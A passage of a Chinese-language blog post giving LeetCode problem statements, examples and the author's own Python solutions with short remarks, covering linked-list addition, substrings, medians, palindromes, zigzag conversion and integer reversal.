&#x3D; 807.</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [0], l2 &#x3D; [0]</span><br><span class="line">输出：[0]</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [9,9,9,9,9,9,9], l2 &#x3D; [9,9,9,9]</span><br><span class="line">输出：[8,9,9,9,0,0,0,1]</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#   def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#   self.val = val</span></span><br><span class="line"><span class="comment">#   self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span>(<span class="params">self, l1: ListNode, l2: ListNode</span>) -&gt; ListNode:</span></span><br><span class="line">temp_node = ListNode()</span><br><span class="line">head = temp_node</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 两个链表同步部分</span></span><br><span class="line">temp_node.val = l1.val + l2.val</span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line">temp_node.val += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> temp_node.val &gt;= <span class="number">10</span>:</span><br><span class="line">overflow = <span class="literal">True</span></span><br><span class="line">temp_node.val %= <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> != <span class="literal">None</span> <span class="keyword">and</span> l2.<span class="built_in">next</span> != <span class="literal">None</span>:</span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">l1 = l1.<span class="built_in">next</span></span><br><span class="line">l2 = l2.<span class="built_in">next</span></span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> == <span class="literal">None</span> <span class="keyword">and</span> l2.<span class="built_in">next</span> == <span class="literal">None</span>: <span class="comment"># 两个链表同时结束</span></span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = <span class="number">1</span></span><br><span class="line">overflow == <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span>(head)</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># 一个链表提前结束</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> != <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">l1 = l1.<span class="built_in">next</span></span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = l1.val</span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line">temp_node.val += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> temp_node.val &gt;= <span class="number">10</span>:</span><br><span class="line">overflow = <span class="literal">True</span></span><br><span class="line">temp_node.val %= <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> == <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> l2.<span class="built_in">next</span> != <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">l2 = l2.<span class="built_in">next</span></span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = l2.val</span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line">temp_node.val += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> temp_node.val &gt;= <span class="number">10</span>:</span><br><span class="line">overflow = <span class="literal">True</span></span><br><span class="line">temp_node.val %= <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> l2.<span class="built_in">next</span> == <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>: <span class="comment"># 额外进位</span></span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = <span class="number">1</span></span><br><span class="line">overflow == <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span>(head)</span><br></pre></td></tr></table></figure><p>几个坑有点麻烦</p><ol><li>两个链表长度不同，还得分l1、l2两种情况</li><li>进位，基本每一步计算都要检测进位</li><li>额外进位，两个二位数加出来一个三位数</li></ol><hr /><h1 id="无重复字符的最长子串"><a class="markdownIt-Anchor" href="#无重复字符的最长子串"></a> <a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters">无重复字符的最长子串</a></h1><p>给定一个字符串s，请你找出其中不含有重复字符的<strong>最长子串</strong>的长度。</p><p>示例 1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure><p>示例 2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br></pre></td></tr></table></figure><p>示例 3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是&quot;wke&quot;，所以其长度为 3。</span><br><span class="line"> 请注意，你的答案必须是 子串 的长度，&quot;pwke&quot;是一个子序列，不是子串。</span><br></pre></td></tr></table></figure><p>示例 4:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;&quot;</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters">https://leetcode-cn.com/problems/longest-substring-without-repeating-characters</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span> length == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sub_len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, length):</span><br><span class="line"><span class="keyword">if</span> s[index2] <span class="keyword">in</span> s[index1:index2]:</span><br><span class="line">temp_len = index2 - index1</span><br><span class="line"><span class="keyword">if</span> temp_len &gt; sub_len:</span><br><span class="line">sub_len = temp_len</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> index2 == length - <span class="number">1</span>:</span><br><span class="line">temp_len = index2 + <span class="number">1</span> - index1</span><br><span class="line"><span class="keyword">if</span> temp_len &gt; sub_len:</span><br><span class="line">sub_len = temp_len</span><br><span class="line"><span class="keyword">return</span>(sub_len)</span><br></pre></td></tr></table></figure><p>依旧暴力搜索，有几个坑</p><ol><li>空串</li><li>单字符</li><li>子串结尾与母串结尾相同</li></ol><hr /><h1 id="寻找两个正序数组的中位数"><a class="markdownIt-Anchor" href="#寻找两个正序数组的中位数"></a> <a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays">寻找两个正序数组的中位数</a></h1><p>给定两个大小分别为<code>m</code>和<code>n</code>的正序（从小到大）数组<code>nums1</code>和<code>nums2</code>。请你找出并返回这两个正序数组的<strong>中位数</strong>。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [1,3], nums2 &#x3D; [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 &#x3D; [1,2,3] ，中位数 2</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [1,2], nums2 &#x3D; [3,4]</span><br><span class="line">输出：2.50000</span><br><span class="line">解释：合并数组 &#x3D; [1,2,3,4] ，中位数 (2 + 3) &#x2F; 2 &#x3D; 2.5</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [0,0], nums2 &#x3D; [0,0]</span><br><span class="line">输出：0.00000</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [], nums2 &#x3D; [1]</span><br><span class="line">输出：1.00000</span><br></pre></td></tr></table></figure><p>示例 5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [2], nums2 &#x3D; []</span><br><span class="line">输出：2.00000</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays">https://leetcode-cn.com/problems/median-of-two-sorted-arrays</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span>(<span class="params">self, nums1: List[<span class="built_in">int</span>], nums2: List[<span class="built_in">int</span>]</span>) -&gt; float:</span></span><br><span class="line">new_list = nums1 + nums2</span><br><span class="line">new_list.sort()</span><br><span class="line">length = <span class="built_in">len</span>(new_list)</span><br><span class="line"><span class="keyword">if</span> length % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">mid_num = new_list[(length - <span class="number">1</span>)//<span class="number">2</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mid_num = (new_list[(length)//<span class="number">2</span> - <span class="number">1</span>] + new_list[(length)//<span class="number">2</span>]) / <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span>(mid_num)</span><br></pre></td></tr></table></figure><p>list().sort() yyds</p><hr /><h1 id="最长回文子串"><a class="markdownIt-Anchor" href="#最长回文子串"></a> <a href="https://leetcode-cn.com/problems/longest-palindromic-substring">最长回文子串</a></h1><p>给你一个字符串<code>s</code>，找到<code>s</code>中最长的回文子串。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;babad&quot;</span><br><span class="line">输出：&quot;bab&quot;</span><br><span class="line">解释：&quot;aba&quot; 同样是符合题意的答案。</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;cbbd&quot;</span><br><span class="line">输出：&quot;bb&quot;</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;a&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ac&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/longest-palindromic-substring">https://leetcode-cn.com/problems/longest-palindromic-substring</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; str:</span></span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(s)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sub_str = <span class="string">&quot;&quot;</span></span><br><span class="line">sub_len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>, index1-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> s[index2] == s[index1] <span class="keyword">and</span> s[index1:index2+<span class="number">1</span>] == s[index1:index2+<span class="number">1</span>][::-<span class="number">1</span>]:</span><br><span class="line">temp_len = index2 + <span class="number">1</span> - index1</span><br><span class="line"><span class="keyword">if</span> temp_len &gt; sub_len:</span><br><span class="line">sub_len = temp_len</span><br><span class="line">sub_str = s[index1:index2+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span>(sub_str)</span><br></pre></td></tr></table></figure><p>看到&quot;ccc&quot;这个测试数据人都傻了<br />换个角度思考，逆向搜寻字符串就好解决这事了</p><hr /><h1 id="z-字形变换"><a class="markdownIt-Anchor" href="#z-字形变换"></a> <a href="https://leetcode-cn.com/problems/zigzag-conversion">Z 字形变换</a></h1><p>将一个给定字符串s根据给定的行数<code>numRows</code>，以从上往下、从左到右进行<code>Z</code>字形排列。</p><p>比如输入字符串为<code>&quot;PAYPALISHIRING&quot;</code>行数为3时，排列如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br></pre></td></tr></table></figure><p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;PAHNAPLSIIGYIR&quot;</code>。</p><p>请你实现这个将字符串进行指定行数变换的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string convert(string s, int numRows);</span><br></pre></td></tr></table></figure><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 3</span><br><span class="line">输出：&quot;PAHNAPLSIIGYIR&quot;</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 4</span><br><span class="line">输出：&quot;PINALSIGYAHRPI&quot;</span><br><span class="line">解释：</span><br><span class="line">P IN</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P I</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;A&quot;, numRows &#x3D; 1</span><br><span class="line">输出：&quot;A&quot;</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/zigzag-conversion">https://leetcode-cn.com/problems/zigzag-conversion</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">self, s: <span class="built_in">str</span>, numRows: <span class="built_in">int</span></span>) -&gt; str:</span></span><br><span class="line"><span class="keyword">if</span> numRows == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(s)</span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">forward = <span class="literal">True</span></span><br><span class="line">y = -<span class="number">1</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(numRows):</span><br><span class="line">lst.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line"><span class="keyword">if</span> forward == <span class="literal">True</span>:</span><br><span class="line">y += <span class="number">1</span></span><br><span class="line">lst[y] += s[index]</span><br><span class="line"><span class="keyword">if</span> y == numRows-<span class="number">1</span>:</span><br><span class="line">forward = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">y -= <span class="number">1</span></span><br><span class="line">lst[y] += s[index]</span><br><span class="line"><span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">forward = <span class="literal">True</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> lst:</span><br><span class="line">result += _</span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>一开始各种算形状的周期、余数、重复次数<br />然后拿这些玩意算矩阵宽度<br />再造一个二维列表当矩阵<br />看到用时超过11%，内存超过7%就知道自己在犯病了</p><p>直接把这个题想象成一维的来回扫描模型就好多了</p><hr /><h1 id="整数反转"><a class="markdownIt-Anchor" href="#整数反转"></a> <a href="https://leetcode-cn.com/problems/reverse-integer">整数反转</a></h1><p>给你一个<code>32</code>位的有符号整数<code>x</code>，返回将<code>x</code>中的数字部分反转后的结果。</p><p>如果反转后整数超过<code>32</code>位的有符号整数的范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>，就返回<code>0</code>。</p><p>假设环境不允许存储64位整数（有符号或无符号）。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; -123</span><br><span class="line">输出：-321</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 120</span><br><span class="line">输出：21</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 0</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/reverse-integer">https://leetcode-cn.com/problems/reverse-integer</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; int:</span></span><br><span class="line">temp = []</span><br><span class="line">negative = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">negative = <span class="literal">True</span></span><br><span class="line">x = - x</span><br><span class="line"><span class="keyword">while</span> x != <span class="number">0</span>:</span><br><span class="line">temp.append(x % <span class="number">10</span>)</span><br><span class="line">x //= <span class="number">10</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1</span>, -<span class="built_in">len</span>(temp)-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">num += temp[_] * <span class="built_in">pow</span>(<span class="number">10</span>, cnt)</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> negative == <span class="literal">True</span> <span class="keyword">and</span> num &lt;= <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">num = -num</span><br><span class="line"><span class="keyword">return</span>(num)</span><br><span class="line"><span class="keyword">elif</span> negative == <span class="literal">False</span> <span class="keyword">and</span> num &lt;= <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>) - <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(num)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>挨个模10取余数丢列表<br />然后反向读列表就行<br />速度不错，但是内存太高了</p><hr /><h1 id="字符串转换整数-atoi"><a class="markdownIt-Anchor" href="#字符串转换整数-atoi"></a> <a href="https://leetcode-cn.com/problems/string-to-integer-atoi">字符串转换整数 (atoi)</a></h1><p>请你来实现一个<code>myAtoi(string s)</code>函数，使其能将字符串转换成一个 32 位有符号整数（类似 C/C++ 中的<code>atoi</code>函数）。</p><p>函数<code>myAtoi(string s)</code>的算法如下：</p><ul><li>读入字符串并丢弃无用的前导空格</li><li>检查下一个字符（假设还未到字符末尾）为正还是负号，读取该字符（如果有）。 确定最终结果是负数还是正数。 